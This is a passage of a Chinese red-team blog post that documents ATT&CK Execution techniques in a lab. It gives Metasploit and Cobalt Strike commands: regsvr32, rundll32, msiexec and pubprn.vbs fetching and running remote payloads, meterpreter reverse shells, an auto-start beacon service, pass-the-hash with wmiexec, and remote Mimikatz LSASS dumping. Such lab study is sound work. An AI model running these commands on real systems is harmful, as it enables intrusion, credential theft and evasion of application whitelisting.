+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">se auxiliary&#x2F;server&#x2F;regsvr32_command_delivery_server</span><br><span class="line">set CMD net user testreg testreg &#x2F;add</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574418910067.png" alt="1574418910067"></p>
+<p>直接执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.144.176:8080&#x2F;rdIbhY scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574418984609.png" alt="1574418984609"></p>
+<p>这里是直接照着Micropoor的文章里执行的创建用户的命令，在MSF中使用有回显的命令时发现会报错，实际可以直接执行反弹shell的dll文件。</p>
+<h3 id="直接反弹shell"><a href="#直接反弹shell" class="headerlink" title="直接反弹shell"></a>直接反弹shell</h3><p>MSF：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">set target 3</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.144.176</span><br><span class="line">set srvhost 192.168.144.176</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1576566949215.png" alt="1576566949215"></p>
+<p>目标主机执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.144.176:8080&#x2F;ZdmFgyl2Hz.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p>但是执行之后发现都出现了错误，猜测是64位的原因？：</p>
+<p><img src="Execution.assets/1576567010173.png" alt="1576567010173"></p>
+<h2 id="Rundll32-T1085"><a href="#Rundll32-T1085" class="headerlink" title="Rundll32-T1085"></a>Rundll32-T1085</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>rundll32.exe程序可以用来执行任意二进制文件。攻击者可以利用此功能来代理代码的执行，以避免触发可能无法监视rundll32.exe进程执行的安全工具，因为Windows使用rundll32.exe进行正常操作时出现白名单或误报。</p>
+<p>几种执行方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本地：</span><br><span class="line">rundll32 shell32.dll,Control_RunDLL C:\test.dll</span><br><span class="line">通过UNC路径调用：</span><br><span class="line">rundll32.exe \\192.168.1.107\ZtmW\test.dll,0</span><br><span class="line">通过js调用：</span><br><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;document.write();GetObject(&quot;script:http:&#x2F;&#x2F;192.168.1.4&#x2F;Rundll32_shellcode&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用MSF反弹shell"><a href="#使用MSF反弹shell" class="headerlink" title="使用MSF反弹shell"></a>使用MSF反弹shell</h3><p>msf:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_delivery</span><br><span class="line">set srvhost 192.168.144.176</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1576565842918.png" alt="1576565842918"></p>
+<p>目标主机执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe \\192.168.144.176\XzuN\test.dll,0</span><br></pre></td></tr></table></figure>
+
+<h2 id="（未完成）Scheduled-Task-T1053"><a href="#（未完成）Scheduled-Task-T1053" class="headerlink" title="（未完成）Scheduled Task-T1053"></a>（未完成）Scheduled Task-T1053</h2><p>即通过计划任务进行执行指定文件，不过感觉这种方式一般可能会用来运行后门文件</p>
+<h2 id="Scripting-T1064"><a href="#Scripting-T1064" class="headerlink" title="Scripting-T1064"></a>Scripting-T1064</h2><p>脚本？同样是概念的一个点，提到了powershell和VB等等很多其他的脚本。</p>
+<h2 id="Service-Execution-T1035"><a href="#Service-Execution-T1035" class="headerlink" title="Service Execution-T1035"></a>Service Execution-T1035</h2><p>在windows中可以把程序注册成为一个服务来执行，可以通过创建新服务或者是修改现有服务来完成。</p>
+<p>如果是创建一个新的服务，则需要使用sc.exe（Service Control）进行创建。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe create testsca binpath&#x3D; c:\users\Administrator\Desktop\a.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574753720810.png" alt="1574753720810"></p>
+<p>创建之后可以看到已经新建了名称为testsca的</p>
+<p><img src="Execution.assets/1574754760399.png" alt="1574754760399"></p>
+<p>可以看到已经创建的服务，但是服务起起来会出现问题，看到网上说的原因是被注册为服务的exe文件需要有特定的格式，但是因为不是很熟悉Windows下的API编程，所以这里用C#进行了尝试。具体的使用VS2017生成一个服务exe的文件可以参考链接：</p>
+<p><a href="https://www.jb51.net/article/124723.htm" target="_blank" rel="noopener">https://www.jb51.net/article/124723.htm</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/windows-services/walkthrough-creating-a-windows-service-application-in-the-component-designer" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/windows-services/walkthrough-creating-a-windows-service-application-in-the-component-designer</a></p>
+<p>代码内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.ComponentModel;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.ServiceProcess;</span><br><span class="line"></span><br><span class="line">namespace WindowsService1</span><br><span class="line">&#123;</span><br><span class="line">    public partial class TestAttckService : ServiceBase</span><br><span class="line">    &#123;</span><br><span class="line">        public TestAttckService()</span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected override void OnStart(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            ProcessStartInfo test_calc &#x3D; new ProcessStartInfo(&quot;calc.exe&quot;);</span><br><span class="line">            Process calc &#x3D; new Process();</span><br><span class="line">            calc.StartInfo &#x3D; test_calc;</span><br><span class="line">            calc.Start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected override void OnStop()</span><br><span class="line">        &#123;</span><br><span class="line">            ProcessStartInfo test_calc &#x3D; new ProcessStartInfo(&quot;calc.exe&quot;);</span><br><span class="line">            Process calc &#x3D; new Process();</span><br><span class="line">            calc.StartInfo &#x3D; test_calc;</span><br><span class="line">            calc.Start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接执行可以看到错误</p>
+<p><img src="Execution.assets/1574757469614.png" alt="1574757469614"></p>
+<p>也就是说是需要InstallUtil.exe文件来进行安装服务（和上文中的区别是这个是用于安装服务的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe E:\3_C\C#\WindowsService1\WindowsService1\bin\Debug\WindowsService1.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574762535816.png" alt="1574762535816"></p>
+<p>这里提示安装成功，之后可以在服务中看到对应的服务，不过在使用ProcessStartInfo创建新进程的时候发现并不能成功，执行命令也不能成功。</p>
+<p><img src="Execution.assets/1574762565496.png" alt="1574762565496"></p>
+<p>随后将OnStart方法的代码改成了上文中网站中提供的代码（打印日志的代码）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected override void OnStart(string[] args) </span><br><span class="line">&#123;</span><br><span class="line">	using (System.IO.StreamWriter sw &#x3D; new System.IO.StreamWriter(&quot;C:\\log.txt&quot;, true)) </span><br><span class="line">	&#123;</span><br><span class="line">		sw.WriteLine(DateTime.Now.ToString(&quot;yyyy-MM-dd HH:mm:ss &quot;) + &quot;Start.&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后发现能够成功在C盘中输出log.txt。没有执行命令成功的原因就没有再跟。</p>
+<h3 id="使用CS创建新服务"><a href="#使用CS创建新服务" class="headerlink" title="使用CS创建新服务"></a>使用CS创建新服务</h3><p>在已经创建的Beacon中上传exe文件，并创建服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd \\win2012\c$</span><br><span class="line">upload c:\users\xxm\desktop\artfact.exe</span><br><span class="line">run sc create &quot;beaconPen&quot; binpath&#x3D; &quot;cmd &#x2F;c start &quot;C:\artifact.exe&quot;&quot;&amp;&amp;sc config &quot;beaconPen&quot; start&#x3D; auto&amp;&amp;net start  beaconPn</span><br></pre></td></tr></table></figure>
+
+<h2 id="Signed-Binary-Proxy-Execution-T1218"><a href="#Signed-Binary-Proxy-Execution-T1218" class="headerlink" title="Signed Binary Proxy Execution-T1218"></a>Signed Binary Proxy Execution-T1218</h2><p>使用可信数字证书签名的二进制文件可以在受数字签名验证保护的Windows系统上执行。攻击者可能会滥用此行为来执行可能绕过系统上的应用程序白名单和签名验证的恶意文件。</p>
+<h3 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h3><p>msiexec.exe默认位置在C:\Windows\System32\和C:\Windows\SysWOW64\。Msiexec.exe是Windows Installer的命令行Windows实用程序。攻击者可能会使用msiexec.exe启动恶意MSI文件以执行代码。攻击者可以使用它来启动本地或网络可访问的MSI文件。Msiexec.exe也可用于执行DLL。</p>
+<p>Msfvenom生成反弹shell的txt文件。</p>
+<p><img src="Execution.assets/1574764009355.png" alt="1574764009355"></p>
+<p>使用msiexec.exe执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe &#x2F;q &#x2F;i testMsiexec.txt</span><br></pre></td></tr></table></figure>
+
+<p>执行之后反弹shell成功</p>
+<p><img src="Execution.assets/1574764046496.png" alt="1574764046496"></p>
+<p>能够反弹shell但是立马就会断。还有就是使用msi格式的也可以反弹shell，同时都没有被当前使用的杀毒软件查杀，但是dll类型的是被查杀了。</p>
+<p>同样可以执行远程文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.1.109&#x2F;1.msi</span><br></pre></td></tr></table></figure>
+
+<h3 id="mavinject-exe"><a href="#mavinject-exe" class="headerlink" title="mavinject.exe"></a>mavinject.exe</h3><p>Mavinject.exe是一个允许代码执行的Windows实用程序。Mavinject可用于将DLL注入到正在运行的进程中。</p>
+<p>命令为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe&quot; &lt;PID&gt; &#x2F;INJECTRUNNING &lt;PATH DLL&gt;</span><br><span class="line">C:\Windows\system32\mavinject.exe &lt;PID&gt; &#x2F;INJECTRUNNING &lt;PATH DLL&gt;</span><br></pre></td></tr></table></figure>
+
+<p>官方的下载地址没有找到，下面两个链接可以参考，不过建议在虚拟机执行：</p>
+<p><a href="https://www.pconlife.com/viewfileinfo/mavinject-exe/" target="_blank" rel="noopener">https://www.pconlife.com/viewfileinfo/mavinject-exe/</a></p>
+<p><a href="https://www.winpcware.com/extension/exe/mavinject-exe" target="_blank" rel="noopener">https://www.winpcware.com/extension/exe/mavinject-exe</a></p>
+<h3 id="SyncAppvPublishingServer-exe"><a href="#SyncAppvPublishingServer-exe" class="headerlink" title="SyncAppvPublishingServer.exe"></a>SyncAppvPublishingServer.exe</h3><p>SyncAppvPublishingServer.exe可以在执行powershell.exe的情况下执行powershell脚本。可以用于绕过APPLocker的限制。</p>
+<h3 id="Odbcconf-exe"><a href="#Odbcconf-exe" class="headerlink" title="Odbcconf.exe"></a>Odbcconf.exe</h3><p>Odbcconf.exe是一个Windows实用程序，允许您配置开放式数据库连接（ODBC）驱动程序和数据源名称。该实用程序可能被滥用来执行与Regsvr32等效的功能，并使用REGSVR选项来执行DLL。</p>
+<p>示例命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe &#x2F;S &#x2F;A &#123;REGSVR &quot;C:\Users\Public\file.dll&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Signed-Script-Proxy-Execution-T1216"><a href="#Signed-Script-Proxy-Execution-T1216" class="headerlink" title="Signed Script Proxy Execution-T1216"></a>Signed Script Proxy Execution-T1216</h2><p>使用受信任证书签名的脚本可用于代理恶意文件的执行。此行为可能会绕过签名验证限制和不考虑使用这些脚本的应用程序白名单解决方案。</p>
+<p>PubPrn.vbs由Microsoft签名，可用于代理远程站点的执行。主要作用是将打印机发布到AD域服务。</p>
+<p>默认路径为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs</span><br><span class="line">C:\Windows\SysWOW64\Printing_Admin_Scripts\zh-CN\pubprn.vbs</span><br></pre></td></tr></table></figure>
+
+<p>官方给的例子，可以通过这个脚本把\\Server1上的所有打印机发布到MyDomain.company.Com域中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript Ppubprn Server1 &quot;LDAP:&#x2F;&#x2F;CN&#x3D;MyContainer,DC&#x3D;MyDomain,DC&#x3D;company,DC&#x3D;Com&quot;</span><br></pre></td></tr></table></figure>
+
+<p>用于执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;enigma0x3&#x2F;64adf8ba99d4485c478b67e03ae6b04a&#x2F;raw&#x2F;a006a47e4075785016a62f7e5170ef36f5247cdb&#x2F;test.sct</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574765708547.png" alt="1574765708547"></p>
+<p>Sct脚本内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;registration</span><br><span class="line">    description&#x3D;&quot;Bandit&quot;</span><br><span class="line">    progid&#x3D;&quot;Bandit&quot;</span><br><span class="line">    version&#x3D;&quot;1.00&quot;</span><br><span class="line">    classid&#x3D;&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">    remotable&#x3D;&quot;true&quot;</span><br><span class="line">	&gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">		var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Source-T1153"><a href="#Source-T1153" class="headerlink" title="Source-T1153"></a>Source-T1153</h2><p>MACOS</p>
+<h2 id="Space-after-Filename-T1151"><a href="#Space-after-Filename-T1151" class="headerlink" title="Space after Filename-T1151"></a>Space after Filename-T1151</h2><p>MACOS</p>
+<h2 id="Third-party-Software-T1072"><a href="#Third-party-Software-T1072" class="headerlink" title="Third-party Software-T1072"></a>Third-party Software-T1072</h2><p>原文说的是第三方软件，所以理解为是一种思路吧。</p>
+<h2 id="Trap-T1154"><a href="#Trap-T1154" class="headerlink" title="Trap-T1154"></a>Trap-T1154</h2><p>Trap是Linux下的命令，个人认为原文说的更适用于权限维持中，所以请至权限维持一章看细节。</p>
+<h2 id="Trusted-Developer-Utilities-T1127"><a href="#Trusted-Developer-Utilities-T1127" class="headerlink" title="Trusted Developer Utilities-T1127"></a>Trusted Developer Utilities-T1127</h2><p>这个说的是在一些开发者工具中包含的一些exe文件，能够用于执行任意系统命令。比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MSBuild.exe</span><br><span class="line">DNX.exe</span><br><span class="line">rcsi.exe</span><br><span class="line">WinDbg.exe</span><br><span class="line">cdb.exe</span><br><span class="line">tracker.exe</span><br></pre></td></tr></table></figure>
+
+<p>选一个MSBuild.exe主要说明一下，首先MSBuild.exe可以通过执行C#文件内容来执行shellcode生成XML或者csproj格式的文件方式多种多样，可以直接通过Empire生成：</p>
+<p><img src="Execution.assets/1574765872888.png" alt="1574765872888"></p>
+<p>然后直接将生成到/tmp/目录下的launcher.xml文件放到windows下使用MSBuild.exe执行即可。但是只有.NET 4.0以上的版本才可以执行成功。</p>
+<p><img src="Execution.assets/1574765897790.png" alt="1574765897790"></p>
+<h2 id="Windows-Management-Instrumentation-T1047"><a href="#Windows-Management-Instrumentation-T1047" class="headerlink" title="Windows Management Instrumentation-T1047"></a>Windows Management Instrumentation-T1047</h2><p>Windows Management Instrumentation（WMI）是一种Windows管理功能，可为Windows系统组件的本地和远程访问提供统一的环境。它依赖于本地和远程访问的WMI服务以及远程访问的服务器消息块（SMB）和远程过程调用服务（RPCS）。RPCS通过135端口运行。</p>
+<p>可以直接通过wmic命令来使用wmi功能（wmi不能执行命令，但是可以创建进程执行文件）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.144.177 &#x2F;user:administrator &#x2F;password:admin123!@# process call create calc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574765953625.png" alt="1574765953625"></p>
+<p>这时能够看到进程，但是并没有弹出，说明已经执行了命令</p>
+<p><img src="Execution.assets/1574765965203.png" alt="1574765965203"></p>
+<p>也可以通过一些工具来执行代码，比如winexec.exe：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes 00000000000000000000000000000000:8f909fdb472d0b85cddb3e36669a9b07 administrator@192.168.144.177 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里是通过HASH值进行执行的命令，实际上这就是一次Pass The Hash的攻击技术，通过NTLM协议验证，然后进行远程访问执行命令。</p>
+<p><img src="Execution.assets/1574766158959.png" alt="1574766158959"></p>
+<h2 id="Windows-Remote-Management-T1028"><a href="#Windows-Remote-Management-T1028" class="headerlink" title="Windows Remote Management-T1028"></a>Windows Remote Management-T1028</h2><p>WINRM是WS-Management协议的Microsoft实现，该协议的目的是为跨多种类型的设备（包括固件）和操作系统的管理操作提供一致性和互操作性。WS-Management协议的当前实现基于以下标准规范：HTTPS，HTTP上的SOAP（WS-I配置文件），SOAP 1.2，WS-Addressing，WS-Transfer，WS-Enumeration和WS-Eventing。</p>
+<p>在拥有本地管理员权限以及目的的权限的情况下可以通过WINRM的WSMAN进行执行命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName exchange2012 -ScriptBlock &#123;ipconfig&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574766195009.png" alt="1574766195009"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName exchange2012 -ScriptBlock &#123;whoami&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574766264740.png" alt="1574766264740"></p>
+<p>通过抓包可以看到走的是HTTP协议，命令以及执行结果的传输全部进行了加密</p>
+<p><img src="Execution.assets/1574766292400.png" alt="1574766292400"></p>
+<p><img src="Execution.assets/1574766297358.png" alt="1574766297358"></p>
+<p>同时mimikatz还支持使用WINRM进行远程获取LSASS中存储的hash值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-Mimikatz.ps1</span><br><span class="line">Invoke-Mimikatz -ComputerName exchange2012</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574766323851.png" alt="1574766323851"></p>
+<p>同时也可以用于持久化，将原本没有开启WINRM的主机使用下列命令开启，即可通过WINRM服务远程连接此主机。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-PSRemoting –Force</span><br></pre></td></tr></table></figure>
+
+<p><img src="Execution.assets/1574766377773.png" alt="1574766377773"></p>
+<p>在一些情况下可能无法通过WinRM连接，就是需要一些其他的配置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig</span><br><span class="line">winrm set winrm&#x2F;config&#x2F;Client @&#123;AllowUnencrypted &#x3D; &quot;true&quot;&#125;</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/12-18-ATT&CK_Lateral%20Movement/">ATT&CK_Lateral Movement</a>
+            
+            
+            <a class="next" rel="next" href="/2020/12-18-ATT&CK_Credential%20Access/">ATT&CK_Credential Access</a>
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
